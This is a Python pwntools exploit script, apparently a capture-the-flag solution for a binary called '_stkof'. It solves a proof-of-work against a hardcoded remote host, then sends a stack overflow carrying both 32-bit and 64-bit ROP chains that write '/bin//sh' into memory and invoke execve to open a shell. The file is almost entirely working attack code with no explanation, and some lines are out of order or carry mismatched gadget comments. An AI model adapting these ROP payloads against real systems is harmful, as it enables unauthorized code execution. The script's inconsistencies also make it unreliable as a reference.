#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./_stkof"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
from pwnlib.util.iters import bruteforce
from hashlib import sha256
pool = [chr(x).encode("hex") for x in range(0x100)]
def pow(prefix,data):
    def f(x):
        return sha256((prefix+x).decode("hex")).hexdigest() == data
    ans = bruteforce(f,pool,length = 3,method= 'fixed')
    return prefix + ans
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("49.4.51.149",25391)
    r.recvuntil("hexdigest()=")
    data = r.recvline()[:-1]
    r.recvuntil("=")
    prefix = r.recvline()[:-1]
    r.sendline(pow(prefix,data))
    r.sendline("4e2805940cbe16d567d3fd2a23d20f7a")
    r.interactive()
    r.recvuntil("--> ")
    flag = r.recvline()[:-1]
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

from struct import pack

# Padding goes here
p = ''

p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9060) # @ .data
p += pack('<I', 0x080a8af6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9064) # @ .data + 4
p += pack('<I', 0x080a8af6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9068) # @ .data + 8
p += pack('<I', 0x08056040) # xor eax, eax ; ret
p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080d9060) # @ .data
p += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080d9068) # @ .data + 8
p += pack('<I', 0x080d9060) # padding without overwrite ebx
p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9068) # @ .data + 8
p += pack('<I', 0x080a8af6)
p += pack('<I', 0xb)
p += pack('<I', 0x080495a3) # int 0x80
# Padding goes here
p6 = ''

p6 += pack('<Q', 0x0000000000405895) # pop6 rsi ; ret
p6 += pack('<Q', 0x00000000006a10e0) # @ .data
p6 += pack('<Q', 0x000000000043b97c) # pop6 rax ; ret
p6 += '/bin//sh'
p6 += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
p6 += pack('<Q', 0x0000000000405895) # pop6 rsi ; ret
p6 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
p6 += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
p6 += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
p6 += pack('<Q', 0x00000000004005f6) # pop6 rdi ; ret
p6 += pack('<Q', 0x00000000006a10e0) # @ .data
p6 += pack('<Q', 0x0000000000405895) # pop6 rsi ; ret
p6 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
p6 += pack('<Q', 0x000000000043b9d5) # pop6 rdx ; ret
p6 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
p6 += pack('<Q', 0x000000000043b97c) # @ .data + 8
p6 += pack('<Q', 0x3b) # @ .data + 8

p6 += pack('<Q', 0x0000000000461645) # syscall ; ret

print hex(len(p))
r.recvuntil("it?")
payload = flat(
    "a"*0x110,
    # 32
    p32(0x080481ca),p32(0x0805b4be),
    p64(0x43B421),
    p,
    "b"*8,
    p6    
    )
r.send(payload)
#r.send(p)
print flag
r.sendline("cat %s"%flag)
r.interactive()




